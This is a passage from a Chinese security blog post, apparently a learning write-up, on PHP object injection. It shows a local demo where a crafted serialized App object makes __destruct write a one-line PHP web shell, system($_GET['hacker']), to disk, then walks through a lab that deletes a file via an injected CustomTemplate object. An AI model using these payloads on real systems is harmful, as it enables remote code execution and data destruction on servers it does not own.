+<p>现在进行PHP Object Injection攻击</p>
+<p>同一目录下，建立一个test.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//注意 这里我试过似乎只能外层是&#x27;单引号；内层是双引号&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> App;</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars(serialize(<span class="variable">$obj</span>));<span class="comment">//保证内容被完整地输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="D:\blog\H01iday\source_posts\pics\id12.png" alt="id12"></p>
+<p>将<code>O:3:&quot;App&quot;:2:&#123;s:7:&quot;logFile&quot;;s:8:&quot;test.php&quot;;s:7:&quot;logData&quot;;s:31:&quot;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&quot;;&#125;</code>的内容作为index.php的get data参数</p>
+<p>回看到index.php函数可以发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userInput</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$someData</span> = unserialize(<span class="variable">$userInput</span>);</span><br></pre></td></tr></table></figure>
+
+<p>首先它会被反序列化。反序列化之后其实是一个App类的对象。</p>
+<p>则它消亡之前一定会运行__destruct()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Logs written to log file.&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以从它的运行结果看到 除了原本的两行。多出了第三行。</p>
+<p>这一行就是由data反序列化出来的对象执行的__destruct()函数输出的内容</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id13.png" alt="id13"></p>
+<p><strong>重点来了！！</strong>分析__destruct()函数运行的这一行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br></pre></td></tr></table></figure>
+
+<p>记得test.php中建立的对象的属性值是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以执行的内容就是将$logData的内容写到当前目录下的test.php文件中。【熟悉的一句话木马】</p>
+<p>可以看到test.php文件中的内容已经被修改</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id14.png" alt="id14"></p>
+<p>再向下的攻击就不展示了，最重点的是构造test.php中的app类，利用__destruct()函数</p>
+<h3 id="003Lab-Arbitrary-object-injection-in-PHP"><a href="#003Lab-Arbitrary-object-injection-in-PHP" class="headerlink" title="##003Lab: Arbitrary object injection in PHP"></a>##003Lab: Arbitrary object injection in PHP</h3><p>已知：</p>
+<p>​    credentials: <code>wiener:peter</code></p>
+<p>目标：</p>
+<p>​    inject a malicious serialized object to delete the <code>morale.txt</code> file from Carlos’s home directory. </p>
+<p>首先，用给出的账号登录。在site map发现有一个php文件</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id15.png" alt="id15"></p>
+<p>通过在后面添加~获取该文件的源码</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id16.png" alt="id15"></p>
+<p>在源码中发现__destruct() 函数，且unlink删除lock_file_path路径下的文件</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id17.png" alt="id15"></p>
+<p>那么可以想到，如果我们注入一个CustomTemplate的对象，将该对象的属性中lock_file_path的值设置为我们想要删除的文件的路径。即题目要求的文件路径，则可以成功实现</p>
+<p>访问当前用户信息，得到一个session格式</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id18.png" alt="id18"></p>
+<p>改写session为我们想进行注入的CustomTemplate的对象</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id19.png" alt="id19"></p>
+<p>最终，指定路径文件被顺利删除</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id20.png" alt="id20"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/17/XXE/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/10/23/CSRF/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
